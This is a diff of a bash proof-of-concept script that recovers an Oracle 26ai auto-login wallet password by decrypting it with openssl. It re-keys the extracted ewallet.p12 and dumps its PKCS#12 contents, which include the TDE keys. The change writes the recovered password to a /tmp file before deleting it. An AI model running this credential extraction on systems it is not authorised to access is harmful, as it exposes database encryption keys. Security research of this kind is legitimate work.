@@ -1,5 +1,5 @@
 #!/bin/bash
-# set -x
+#set -x
 #
 # Purpose:
 #   Proof of concept script to deobfuscate Oracle 26ai
@@ -31,6 +31,7 @@ readonly KEY_LEN=16
 readonly CIPHER_OFF=29
 readonly CIPHER_LEN=16
 readonly P12_OFF=45
+readonly WALLET_PWD_FILE="/tmp/wallet.pwd.$$"
 readonly NEW_WALLET="extracted_ewallet.p12"
 
 # -------------------------------------------
@@ -100,6 +101,8 @@ password=$(echo -n "$cipher" | perl -pe 's/([0-9a-f]{2})/chr(hex($1))/egi' |
            openssl enc -d -aes-128-cbc -nopad -K "$key" -iv "$IV"          | 
            od -An -tx1 | tr -d ' \n')
 
+echo -n "$password" | perl -pe 's/([0-9a-f]{2})/chr(hex($1))/egi' > "$WALLET_PWD_FILE"
+
 # -------------------------------------------
 # Show details
 # -------------------------------------------
@@ -126,10 +129,9 @@ fi
 # -------------------------------------------
 # Change extracted ewallet.p12 password
 # -------------------------------------------
-if $ORACLE_HOME/bin/orapki wallet change_pwd        \
-     -wallet $WALLET_ROOT/tde/$NEW_WALLET           \
-     -oldpwd "$(echo -n "$password"                 |
-     perl -pe 's/([0-9a-f]{2})/chr(hex($1))/egi')"  \
+if $ORACLE_HOME/bin/orapki wallet change_pwd \
+     -wallet $WALLET_ROOT/tde/$NEW_WALLET    \
+     -oldpwd "$(cat $WALLET_PWD_FILE)"       \
      -newpwd "$NEW_PASSWORD" >/dev/null 2>&1
 then
     printf "Changed extracted ewallet.p12 password\n\n"
@@ -144,5 +146,10 @@ fi
 printf "Extracted PKCS#12 contents are (ewallet.p12):\n\n"
 openssl pkcs12 -in $WALLET_ROOT/tde/$NEW_WALLET \
   -nodes -passin "pass:$NEW_PASSWORD" 2>/dev/null
+
+# -------------------------------------------
+# Cleanup
+# -------------------------------------------
+[[ -e "$WALLET_PWD_FILE" ]] && rm -f "$WALLET_PWD_FILE"
 
 exit 0
